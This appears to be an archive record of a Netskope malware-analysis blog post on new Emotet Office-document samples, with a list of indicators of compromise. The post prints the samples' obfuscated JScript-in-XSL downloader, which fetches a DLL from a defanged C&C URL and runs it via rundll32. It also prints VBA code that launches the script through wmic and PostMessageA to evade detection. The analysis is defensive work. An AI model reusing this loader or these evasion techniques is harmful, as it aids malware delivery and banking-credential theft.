{
    "id": "55cac5da-4009-407f-922c-181e57f2b11b",
    "created_at": "2023-01-12T14:59:12.855197Z",
    "updated_at": "2025-03-27T02:05:40.857846Z",
    "deleted_at": null,
    "sha1_hash": "92c68a933bd15873886c60fbce024c09d6207446",
    "title": "2021-01-14 - You Can Run, But You Can’t Hide- Advanced Emotet Updates",
    "authors": "",
    "file_creation_date": "2022-05-28T19:07:09Z",
    "file_modification_date": "2022-05-28T19:07:09Z",
    "file_size": 695750,
    "plain_text": "# You Can Run, But You Can’t Hide: Advanced Emotet Updates\n\n**[netskope.com/blog/you-can-run-but-you-cant-hide-advanced-emotet-updates](https://www.netskope.com/blog/you-can-run-but-you-cant-hide-advanced-emotet-updates)**\n\nGhanashyam Satpathy January 14, 2021\n\n_[Co-authored by Ghanashyam Satpathy and](https://www.netskope.com/blog/author/gsatpathy)_ _[Dagmawi Mulugeta](https://www.netskope.com/blog/author/dmulugetanetskope-com)_\n\n## Summary\n\nEmotet [has become one of the world’s most advanced botnets. Like many malware campaigns,](https://www.netskope.com/blog/netskope-threat-coverage-emotet)\nEmotet’s primary mode of delivery is phishing emails that download malicious Microsoft Office\ndocuments. Furthermore, these documents are often hosted in popular cloud apps like Office 365 and\nAmazon S3 to increase the chances of a successful lure.\n\nAt Netskope, we apply a hybrid approach to malicious Office document detection that leverages a\ncombination of heuristics and supervised machine learning to identify malicious code embedded in\n[documents. In August – September of 2020, we identified Emotet samples that use advanced](https://www.netskope.com/blog/you-can-run-but-you-cant-hide-detecting-malicious-office-documents)\ntechniques like (1) constructing a PowerShell script at runtime, (2) constructing WMI namespaces at\nruntime, and (3) VBA logic obfuscation to evade static and signature-based detections.\n\nOn December 9, 2020, Netskope’s Advanced Threat platform detected downloads of multiple novel\nEmotet samples. These were distributed as Office documents and included additional techniques\nbeing used to evade signature-based threat detection. These techniques consisted of an Embedded\nXSL script and a Squiblytwo Attack. This blog post describes these attack techniques and lists the\nIOCs associated with the samples.\n\n## Analysis\n\n\n-----\n\nEmotet Office document samples are typically Microsoft Excel spreadsheets or Microsoft Word\ndocuments that abuse trusted windows utilities like WMI (Windows Management Instrumentation) to\nconnect to their C&C servers and download their next stage payloads, which have included TrickBot,\nQBot, and Ryuk. In this section, we explain how two new Emotet samples we discovered in\nDecember 2020 (IOCs provided at the end of this document) use new attack techniques to further\nevade detection. We will use the code extracted from the sample\n```\nb9c0ade410b564f79bd95febaac9f3f4 throughout this post.\n\n```\nThe techniques used in these samples include:\n\nEmbedded XSL script,\nSquiblytwo Attack\n\n### Embedded XSL Script\n\nExtensible Stylesheet Language (XSL) files are commonly used to describe the processing and\nrendering of data within XML files. The new Emotet samples embedded malicious XSL scripts inside\nthe VBA text control property. VBA control properties are not usually scanned by AVs as this particular\nVBA stream (“O” stream) does not contain any VBA code. However, these samples store the scripts in\ncontrol properties before downloading and executing them, as we discuss in the next section. The\nfollowing screenshot shows the VBA project of one sample. The XSL string can be seen inside the\ncontrol `brraQWKmlhxwEUuD (Textbox) text property.`\n\nIn the following screenshots, the VBA code extracts the XSL string and saves it to a local file.\n\n\n-----\n\nThe XSL script contains JScript code which uses the MSXML.HTTP COM object to connect to a live\nC&C server as well as the ADODB.STREAM COM object to download a malicious dll payload to local\ndisk. Then, rundll32.exe’s DllRegisterServer() function is invoked on the downloaded dll, which is\nprimarily a banking trojan that steals sensitive information and carries out further infection. Similar to\npreviously seen non-XSL samples, recognizable keywords like ADODB.STREAM, SHELL and\nMSXML2.XMLHTTP.60 are reversed to avoid static detection. These relevant sections of the XSL\nscript can be seen highlighted in red below.\n\n\n-----\n\n```\n ?xml version 1.0 ? \n<stylesheet\nxmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\" \nxmlns:user=\"placeholder\" \nversion=\"1.0\">\n<ms:script implements-prefix=\"user\" language=\"JScript\">\n……….\n……….\n<![CDATA[\nvar YYy5U9_3ubzx_jzmWY_kqiaK =\n[\"m\",\"a\",\"e\",\"r\",\"t\",\"s\",\".\",\"b\",\"d\",\"o\",\"d\",\"a\"].reverse().join(\"\");\nH1pyKm_1epSOa_w07pV(5070)\nfunction dxdNHc_ahxqF(MTdLBC8tVBdkKSLPkhx)\n{return new ActiveXObject(MTdLBC8tVBdkKSLPkhx)};\n]]>\n</ms:script>\n<ms:script implements-prefix=\"user\" language=\"JScript\">\n<![CDATA[\nvar c31fCXrG0n9yFYU6NOd7nJG =\n[['hxxps://gpu.utepils.es/v2/lib/ErrorHandler/public/EWbJwE6eMn[.]php', 'DllRegisterServer'],\n…..\n…..]\nvar OpD5THUm4wmla = [\"l\",\"l\",\"e\",\"h\",\"s\"].reverse().join(\"\");\n]]>\n</ms:script>\n…..\n…..\n<ms:script implements-prefix=\"user\" language=\"JScript\">\n<![CDATA[\nvar VQJYuHiIaJJ9kKlk3 =\n[\"0\",\".\",\"6\",\".\",\"p\",\"t\",\"t\",\"h\",\"l\",\"m\",\"x\",\".\",\"2\",\"l\",\"m\",\"x\",\"s\",\"m\"].reverse().join(\"\");\nfunction H8oKu2_2Yjex_3CCppL_aNZqbY()\n{return Math.random().toString(36).substr(2, 5);};\n]]>\n….\n….\n<![CDATA[\nvar UVmJeOaE0Iyvn8twpitsksb = c31fCXrG0n9yFYU6NOd7nJG.length;\nfor (var i = 0; i < UVmJeOaE0Iyvn8twpitsksb; i++)\ntry{\nvar hK3nwLU_tiW2a_PUo0Bd = dxdNHc_ahxqF(VQJYuHiIaJJ9kKlk3);\nvar s8kAzF8scysPCEOLx88HvSe = dxdNHc_ahxqF(YYy5U9_3ubzx_jzmWY_kqiaK);\nhK3nwLU_tiW2a_PUo0Bd.open(jgDZyVP_0Odx6, c31fCXrG0n9yFYU6NOd7nJG[i][0], 0);\nhK3nwLU_tiW2a_PUo0Bd.send();\nif (Number(ySGWlFT_qYfuwy_B4wPXN(hK3nwLU_tiW2a_PUo0Bd))== 100+100 &&\nNumber(RazkK7XzpuMRcXCxayyHMQp(hK3nwLU_tiW2a_PUo0Bd)) == 0+1+2+1){\nOjJyq8VVHcKCL5QSHL344E(s8kAzF8scysPCEOLx88HvSe);\ns8kAzF8scysPCEOLx88HvSe.type = 1;\ns8kAzF8scysPCEOLx88HvSe.write(hK3nwLU_tiW2a_PUo0Bd.responsebody);\nvar PEA8abizLVE = hK3nwLU_tiW2a_PUo0Bd.getResponseHeader(\"X-User-Agent\")\ns8kAzF8scysPCEOLx88HvSe.position = 0;\nvar akwmHjYm5cx9J = H8oKu2_2Yjex_3CCppL_aNZqbY().concat([\"l\",\"l\",\"d\",\".\"].reverse().join(\"\"));\nvar C36KvCHab5zNzssN8tubsD = \"C:/Windows/Temp/\".concat(\"/\".concat(akwmHjYm5cx9J))\ns8kAzF8scysPCEOLx88HvSe[ZnBpmZ0CoKmC(4)](C36KvCHab5zNzssN8tubsD, 2);\ns8kAzF8scysPCEOLx88HvSe.close();\nn8s5lEFEYxksTagM0tAE0Ht(\"rundll32 \".concat(C36KvCHab5zNzssN8tubsD.concat(\"\n\".concat(c31fCXrG0n9yFYU6NOd7nJG[i][1]))))\nbreak;}}\n\n```\n\n-----\n\n```\ncatch(err){}\n]]></ms:script>\n</stylesheet>\n\n### Squiblytwo Attack\n\n```\nThe XSL script is executed using the WMI Command Line Utility (wmic.exe). MITRE refers to this\n[technique of executing XSL as a squiblytwo attack. In addition to this approach, the following are done](https://attack.mitre.org/techniques/T1220/)\nin order to avoid static detection:\n\nThe path to WMI is specified as a moniker string (“winmgmts:root\\cimv2:Win32_Process”) that is\nconstructed at runtime,\nThe arguments to WMI are not passed during process creation but after creation using the\n```\n   PostMessageA() API\n\n```\nThe following VBA macro code references an instance of WMI using `GetObject() API by passing a`\nmoniker string.\n```\nWith GetObject(M9hKUgW_SlpmT_l2HQu1.MwOtdD8rIIrfYanxWj)\n\n```\nThe following figure shows the function implementation that constructs the moniker string.\n\nThe malicious process is created using the Create() method of WMI’s Win32_Process class, as shown\nbelow. This creation method leaves a minimal identifiable footprint since WMI is now not reported to\nbe a child process of WINWORD.exe but a child of WMIPrvSe.exe (DCOM process).\n```\n.Create kh1iTtZAGmYi45WHVYxTHZ.H8fIVJx9q18b9umN8j, Null,\nJ4aNjfruH3vefzS8A97FcA(gzaVtOS_Wn5xM_dyo50.A8x77U8msgzro(OniP6T1UUZe))\n\n```\nThe first argument to Create is “wmIC” which is constructed at runtime as shown below.\n\n\n-----\n\nWMI is passed the following arguments to execute the XSL script.\n```\n \"Os geT /FOrMat:\"C:\\Users\\pathto\\F464.XSl\"\n\n```\nThe runtime construction of command line arguments to WMI is shown below.\n\nHowever, these arguments are not passed during the creation of WMI but instead sent through\nWindows API `PostMessageA() call. The VBA macro searches the wmic console via`\n```\nFindWindowExA() using “consolewindowclass” as an argument before sending the parameters.\n\n```\nAfter this, the arguments are sent to the wmic console using `PostMessageA() method call.`\n\nThe Windows API declaration for `PostMessageA and` `FindWindowExA can be seen below.`\n\n\n-----\n\n```\n#If VBA7 Then\nPrivate Declare PtrSafe Function Hv0qfxN_12HILY_w7zI8_AIF0mt Lib \"user32.dll\" Alias\n\"PostMessageA\" (ByVal RmpZFf_ZcsSk_IJUpn_LHlmgV As Long, ByVal MJ4mlN2_ZJ7vo_JzQVyK As Long,\nByVal Xm5RAg8lOVjamcd338M As Long, ByVal U0p3RL0NXDv34P1n1 As Long) As Long\nPrivate Declare PtrSafe Function Y2WPW1I0fE9mRdbGpOevODYzd Lib \"user32.dll\" Alias\n\"FindWindowExA\" (ByVal bckpaUG_L668n_T9F3aa As Long, ByVal mJP6JIRV8ur As Long, ByVal\nXu4wNi_sHSR9_KeLq7_qEAMZ As String, ByVal nRDEuAaQ0q7iBEcMTo As String) As Long\n#Else\nPrivate Declare Function Hv0qfxN_12HILY_w7zI8_AIF0mt Lib \"user32.dll\" Alias \"PostMessageA\"\n(ByVal RmpZFf_ZcsSk_IJUpn_LHlmgV As Long, ByVal MJ4mlN2_ZJ7vo_JzQVyK As Long, ByVal\nXm5RAg8lOVjamcd338M As Long, ByVal U0p3RL0NXDv34P1n1 As Long) As Long\nPrivate Declare Function Y2WPW1I0fE9mRdbGpOevODYzd Lib \"user32.dll\" Alias \"FindWindowExA\"\n(ByVal bckpaUG_L668n_T9F3aa As Long, ByVal mJP6JIRV8ur As Long, ByVal Xu4wNi_sHSR9_KeLq7_qEAMZ\nAs String, ByVal nRDEuAaQ0q7iBEcMTo As String) As Long\n#End If\n\n```\nIn the following image, we can see the invocation of `PostMessageA() with the arguments to execute`\nthe XSL script.\n\n## Netskope Detection\n\n**Netskope Advanced Threat Protection provides proactive coverage against zero-day samples of**\nEmotet and other malicious Office documents using both our ML and heuristic-based static analysis\nengines as well as our cloud sandbox. The following screenshot shows the detection for\n```\nb9c0ade410b564f79bd95febaac9f3f4, indicating it was detected by both Netskope AV and the\n\n```\nNetskope Advanced Heuristic Engine. The indicators section shows the reasons it was detected as\nmalicious: the sample auto executes the macro code described in this blog post, writes files to the\nsystem, as well as executes system APIs.\n\n\n-----\n\n## Conclusion\n\n[In addition to the techniques covered in our previous blog posts, the Emotet samples above use two](https://www.netskope.com/blog/you-can-run-but-you-cant-hide-detecting-malicious-office-documents)\nnew advanced techniques to evade signature-based detection. Netskope Advanced Threat Protection\nincludes a custom Microsoft Office file analyzer and a sandbox to detect campaigns like Emotet that\nare in active development and are spreading using new Office documents. We will continue to provide\nupdates on this threat as it evolves.\n\n## IOCs\n\n### Sample 1: b9c0ade410b564f79bd95febaac9f3f4\n\n**Dropped executable file (DLL name is randomly generated)**\n\nC:/Windows/Temp//m3zt1.dll\n\n**DNS requests**\n\ndomain gpu.utepils[.]es\n\ndomain hub.2mind.com[.]br\n\ndomain swarajcollegeofeducation[.]com\n\ndomain buy.manairge[.]com\n\n\n-----\n\ndomain sniezka-6.test.etriton[.]pl\n\ndomain www.alfenory[.]net\n\n**Connections**\n\nip 23.55.163[.]71\n\nip 91.121.76[.]43\n\nip 103.235.106[.]140\n\nip 178.254.36[.]172\n\nip 23.55.163[.]68\n\nip 167.172.218[.]142\n\nip 185.41.131[.]131\n\nip 47.244.28[.]71\n\n**HTTP requests**\n\nurl hxxp://sniezka-6.test.etriton[.]pl/wp-includes/js/jquery/ui/Cs3xTXhrij[.]php\n\nurl\nhxxp://www.alfenory[.]net/alfenory_erp.de/frontaccounting/purchasing/allocations/REbrGXIrn5Ewu5[.]php\n\n### Sample 2: 58b416ddb58188c5d726e25b62bd4162\n\n**Dropped executable file (DLL name is random generated)**\n\nC:/Windows/Temp//j3vg1.dll\n\n**DNS requests**\n\ndomain babor-kosmetik-steglitz[.]de\n\ndomain sniezka-6.test.etriton[.]pl\n\ndomain hub.2mind.com[.]br\n\ndomain gpu.utepils[.]es\n\ndomain swarajcollegeofeducation[.]com\n\ndomain www.alfenory[.]net\n\ndomain dna.1key[.]win\n\n**Connections**\n\n\n-----\n\nip 185.41.131[.]131\n\nip 91.121.76[.]43\n\nip 2.16.107[.]80\n\nip 178.254.36[.]172\n\nip 103.235.106[.]140\n\nip 167.172.218[.]142\n\nip 2.16.107[.]114\n\nip 222.232.172[.]143\n\n**HTTP requests**\n\nurl hxxp://sniezka-6.test.etriton[.]pl/wp-includes/js/jquery/ui/Cs3xTXhrij[.]php\n\nurl\nhxxp://www.alfenory[.]net/alfenory_erp.de/frontaccounting/purchasing/allocations/tLWENYfjYFd[.]php\n\nurl hxxp://swarajcollegeofeducation[.]com/a4content/a4progallery/nt5asQtUwL[.]php\n\nurl hxxp://dna.1key[.]win/mysql/locale/pt_BR/LC_MESSAGES/ieBUxi2PXfapVpE[.]php\n\n_Thank you to Zhi Xu and Benjamin Chang for helping analyze the sample files and contributing to this_\n_blog._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-14 - You Can Run, But You Can’t Hide- Advanced Emotet Updates.pdf"
    ],
    "report_names": [
        "2021-01-14 - You Can Run, But You Can’t Hide- Advanced Emotet Updates.pdf"
    ],
    "threat_actors": [
        {
            "id": "8a3bd03a-f69b-455b-b88b-3842a3528bfd",
            "created_at": "2022-10-25T16:07:24.178007Z",
            "updated_at": "2025-03-27T02:02:10.132529Z",
            "deleted_at": null,
            "main_name": "SharpPanda",
            "aliases": [
                "Sharp Dragon",
                "SharpPanda"
            ],
            "source_name": "ETDA:SharpPanda",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "RoyalRoad",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535552,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1653764829,
    "ts_modification_date": 1653764829,
    "files": {
        "pdf": "https://archive.orkl.eu/92c68a933bd15873886c60fbce024c09d6207446.pdf",
        "text": "https://archive.orkl.eu/92c68a933bd15873886c60fbce024c09d6207446.txt",
        "img": "https://archive.orkl.eu/92c68a933bd15873886c60fbce024c09d6207446.jpg"
    }
}